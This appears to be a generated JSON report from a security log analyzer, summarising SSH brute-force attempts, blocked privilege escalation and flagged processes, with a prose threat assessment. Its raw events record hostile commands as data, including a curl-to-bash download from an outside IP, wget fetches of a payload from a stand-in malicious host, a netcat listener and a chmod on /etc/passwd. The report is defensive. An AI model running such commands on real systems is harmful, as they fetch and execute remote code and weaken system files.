@@ -1,0 +1,288 @@
+{
+  "total_events": 72,
+  "critical_count": 24,
+  "high_count": 28,
+  "brute_force_detected": true,
+  "privilege_escalation_detected": true,
+  "suspicious_process_detected": true,
+  "top_source_ips": [
+    [
+      "45.33.32.156",
+      23
+    ],
+    [
+      "192.168.1.15",
+      13
+    ],
+    [
+      "89.248.165.64",
+      11
+    ],
+    [
+      "198.20.69.74",
+      10
+    ],
+    [
+      "185.220.101.45",
+      8
+    ]
+  ],
+  "failed_login_count": 42,
+  "suspicious_users": [
+    "guest",
+    "oracle",
+    "admin",
+    "pi",
+    "damon"
+  ],
+  "event_summary": {
+    "ssh_failed_login": 42,
+    "ssh_successful_login": 8,
+    "sudo": 12,
+    "process_execution": 6,
+    "privilege_escalation": 4
+  },
+  "raw_critical_events": [
+    {
+      "timestamp": "2026-05-27T15:00:27",
+      "event_type": "process_execution",
+      "user": "guest",
+      "source_ip": "198.20.69.74",
+      "process": "curl -s http://45.33.32.156/shell.sh | bash",
+      "status": "detected",
+      "severity": "critical",
+      "note": "suspicious process execution pattern detected"
+    },
+    {
+      "timestamp": "2026-05-27T15:14:58",
+      "event_type": "process_execution",
+      "user": "oracle",
+      "source_ip": "198.20.69.74",
+      "process": "wget http://malicious.example.com/payload",
+      "status": "detected",
+      "severity": "critical",
+      "note": "suspicious process execution pattern detected"
+    },
+    {
+      "timestamp": "2026-05-27T17:30:34",
+      "event_type": "privilege_escalation",
+      "user": "test",
+      "source_ip": "89.248.165.64",
+      "command": "sudo /bin/bash",
+      "status": "blocked",
+      "severity": "critical",
+      "note": "unauthorized privilege escalation attempt blocked"
+    },
+    {
+      "timestamp": "2026-05-27T18:02:07",
+      "event_type": "privilege_escalation",
+      "user": "guest",
+      "source_ip": "89.248.165.64",
+      "command": "sudo su -",
+      "status": "blocked",
+      "severity": "critical",
+      "note": "unauthorized privilege escalation attempt blocked"
+    },
+    {
+      "timestamp": "2026-05-27T19:16:47",
+      "event_type": "ssh_failed_login",
+      "user": "guest",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:16:50",
+      "event_type": "ssh_failed_login",
+      "user": "test",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:16:53",
+      "event_type": "ssh_failed_login",
+      "user": "oracle",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:16:56",
+      "event_type": "ssh_failed_login",
+      "user": "postgres",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:16:59",
+      "event_type": "ssh_failed_login",
+      "user": "pi",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:02",
+      "event_type": "ssh_failed_login",
+      "user": "guest",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:05",
+      "event_type": "ssh_failed_login",
+      "user": "test",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:08",
+      "event_type": "ssh_failed_login",
+      "user": "oracle",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:11",
+      "event_type": "ssh_failed_login",
+      "user": "postgres",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:14",
+      "event_type": "ssh_failed_login",
+      "user": "pi",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:17",
+      "event_type": "ssh_failed_login",
+      "user": "guest",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:20",
+      "event_type": "ssh_failed_login",
+      "user": "test",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:23",
+      "event_type": "ssh_failed_login",
+      "user": "oracle",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:17:26",
+      "event_type": "ssh_failed_login",
+      "user": "postgres",
+      "source_ip": "45.33.32.156",
+      "port": 22,
+      "status": "failed",
+      "severity": "critical",
+      "note": "rapid sequential login attempts \u2014 possible brute force"
+    },
+    {
+      "timestamp": "2026-05-27T19:28:16",
+      "event_type": "process_execution",
+      "user": "oracle",
+      "source_ip": "89.248.165.64",
+      "process": "wget http://malicious.example.com/payload",
+      "status": "detected",
+      "severity": "critical",
+      "note": "suspicious process execution pattern detected"
+    },
+    {
+      "timestamp": "2026-05-27T19:36:54",
+      "event_type": "process_execution",
+      "user": "oracle",
+      "source_ip": "45.33.32.156",
+      "process": "wget http://malicious.example.com/payload",
+      "status": "detected",
+      "severity": "critical",
+      "note": "suspicious process execution pattern detected"
+    },
+    {
+      "timestamp": "2026-05-27T20:02:32",
+      "event_type": "process_execution",
+      "user": "guest",
+      "source_ip": "198.20.69.74",
+      "process": "nc -lvp 4444",
+      "status": "detected",
+      "severity": "critical",
+      "note": "suspicious process execution pattern detected"
+    },
+    {
+      "timestamp": "2026-05-27T20:13:19",
+      "event_type": "privilege_escalation",
+      "user": "oracle",
+      "source_ip": "89.248.165.64",
+      "command": "sudo su -",
+      "status": "blocked",
+      "severity": "critical",
+      "note": "unauthorized privilege escalation attempt blocked"
+    },
+    {
+      "timestamp": "2026-05-27T20:21:21",
+      "event_type": "privilege_escalation",
+      "user": "test",
+      "source_ip": "185.220.101.45",
+      "command": "chmod 777 /etc/passwd",
+      "status": "blocked",
+      "severity": "critical",
+      "note": "unauthorized privilege escalation attempt blocked"
+    },
+    {
+      "timestamp": "2026-05-27T20:42:43",
+      "event_type": "process_execution",
+      "user": "pi",
+      "source_ip": "185.220.101.45",
+      "process": "wget http://malicious.example.com/payload",
+      "status": "detected",
+      "severity": "critical",
+      "note": "suspicious process execution pattern detected"
+    }
+  ],
+  "threat_assessment": "The overall risk level is high due to the large number of critical events and failed SSH logins detected over the analysis period. With 24 critical events and 42 failed SSH logins out of 72 total security events, it is clear that the system is under significant attack. The fact that brute force detection and privilege escalation attempts were also flagged further underscores the severity of the threat.\n\nThe most concerning findings are the high number of failed SSH logins, which suggests that an attacker is actively trying to gain access to the system using automated tools. The presence of privilege escalation attempts and suspicious process execution also implies that if the attacker is successful in gaining initial access, they will likely try to move laterally and exploit vulnerabilities to gain higher levels of access. The top source IPs, including 45.33.32.156 and 192.168.1.15, are likely the sources of these attacks and should be investigated further.\n\nThe system's SSH configuration should be reviewed immediately to ensure that it is properly secured, including implementing measures such as rate limiting and IP blocking to prevent further brute force attacks. The top source IPs should be blocked at the firewall level to prevent any further attacks from those locations. The system's logs should be further analyzed to determine if any of the failed SSH logins were successful, and if so, a full incident response should be initiated to determine the scope of the breach and contain any potential damage."
+}
